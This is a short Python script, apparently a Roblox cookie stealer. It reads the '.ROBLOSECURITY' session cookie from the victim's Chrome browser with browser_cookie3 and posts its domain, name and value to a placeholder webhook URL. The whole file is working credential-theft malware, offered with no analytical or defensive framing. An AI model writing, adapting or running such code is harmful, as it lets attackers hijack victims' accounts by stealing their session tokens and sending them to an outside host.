import browser_cookie3
import requests
import json

webhook_url = 'webhak here!'

cookies = browser_cookie3.chrome(domain_name='.roblox.com')
cookie_name = '.ROBLOSECURITY'

for cookie in cookies:
    if cookie.name == cookie_name:
        message = f"Domain: {cookie.domain}\nName: {cookie.name}\nValue: {cookie.value}"
        data = {'content': message}
        response = requests.post(webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
        if response.status_code == 204:
            print('logged sent cookies')
        else:
            print('failed to send cookies')
        break
